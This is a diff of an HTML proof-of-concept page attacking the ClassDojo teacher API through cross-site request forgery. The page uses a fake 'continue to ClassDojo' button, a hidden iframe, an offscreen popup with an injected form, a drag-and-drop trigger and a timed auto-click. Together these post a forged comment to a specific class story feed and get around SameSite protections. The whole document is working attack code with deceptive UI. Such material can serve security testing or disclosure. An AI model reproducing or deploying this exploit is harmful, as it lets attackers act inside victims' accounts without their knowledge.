@@ -1,11 +1,105 @@
 <html>
-    <body>
-        <form action="https://teach.classdojo.com/api/dojoClass/6971f28f8a5dbae528dd62ce/storyFeed/6971f4bdf0e461e7747059e7/comments" method="POST">
-             <input type="hidden" name="_method" value="GET">
-            <input type="hidden" name="body" value="CSRFpwned@evil-user.net" />
-        </form>
-        <script>
-            document.forms[0].submit();
-        </script>
-    </body>
+<head>
+    <style>
+        iframe {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            border: none;
+            visibility: hidden;
+        }
+        
+        /* Fake UI to trick user */
+        #fakeButton {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px 40px;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            z-index: 10000;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+        
+        #fakeButton:hover {
+            background: #3367d6;
+        }
+    </style>
+</head>
+<body>
+    <!-- Fake attractive button for user to click -->
+    <button id="fakeButton">Click to continue to ClassDojo</button>
+    
+    <!-- Hidden iframe for CSRF attack -->
+    <iframe id="csrfFrame" name="csrfFrame"></iframe>
+    
+    <!-- Form that will be submitted -->
+    <form id="csrfForm" action="https://teach.classdojo.com/api/dojoClass/6971f28f8a5dbae528dd62ce/storyFeed/6971f4bdf0e461e7747059e7/comments" method="POST" target="csrfFrame">
+        <input type="hidden" name="body" value="CSRFpwned@evil-user.net" />
+    </form>
+
+    <script>
+        // Method 1: User gesture + delayed form submission
+        document.getElementById('fakeButton').addEventListener('click', function() {
+            // Show fake loading indicator
+            this.textContent = 'Loading...';
+            this.disabled = true;
+            
+            // Wait a moment then submit (user gesture context)
+            setTimeout(() => {
+                document.getElementById('csrfForm').submit();
+                
+                // Redirect user to legitimate-looking page
+                setTimeout(() => {
+                    window.location.href = 'https://teach.classdojo.com';
+                }, 100);
+            }, 500);
+        });
+        
+        // Method 2: Alternative approach using window.open (bypasses Lax in some browsers)
+        setTimeout(() => {
+            // Create a popup first (initiated by page load, not user)
+            const popup = window.open('', 'csrfPopup', 'width=1,height=1,left=10000,top=10000');
+            
+            if (popup) {
+                // Inject form into popup and submit
+                const formHtml = `
+                    <form id="popupForm" action="https://teach.classdojo.com/api/dojoClass/6971f28f8a5dbae528dd62ce/storyFeed/6971f4bdf0e461e7747059e7/comments" method="POST">
+                        <input type="hidden" name="body" value="CSRFpwned@evil-user.net" />
+                    </form>
+                    <script>
+                        document.getElementById('popupForm').submit();
+                        setTimeout(() => window.close(), 1000);
+                    <\/script>
+                `;
+                
+                popup.document.write(formHtml);
+            }
+        }, 2000);
+        
+        // Method 3: Drag-and-drop + clickjacking combo
+        document.addEventListener('dragstart', function(e) {
+            // Create a drag operation that triggers navigation
+            e.dataTransfer.setData('text/uri-list', 'https://teach.classdojo.com/api/dojoClass/6971f28f8a5dbae528dd62ce/storyFeed/6971f4bdf0e461e7747059e7/comments?body=CSRFpwned@evil-user.net');
+            e.dataTransfer.setData('text/plain', 'https://teach.classdojo.com/api/dojoClass/6971f28f8a5dbae528dd62ce/storyFeed/6971f4bdf0e461e7747059e7/comments?body=CSRFpwned@evil-user.net');
+            
+            // Submit form after drag starts (some browsers preserve user gesture)
+            setTimeout(() => {
+                document.getElementById('csrfForm').submit();
+            }, 100);
+        });
+        
+        // Auto-click after short delay if user doesn't click
+        setTimeout(() => {
+            document.getElementById('fakeButton').click();
+        }, 5000);
+    </script>
+</body>
 </html>
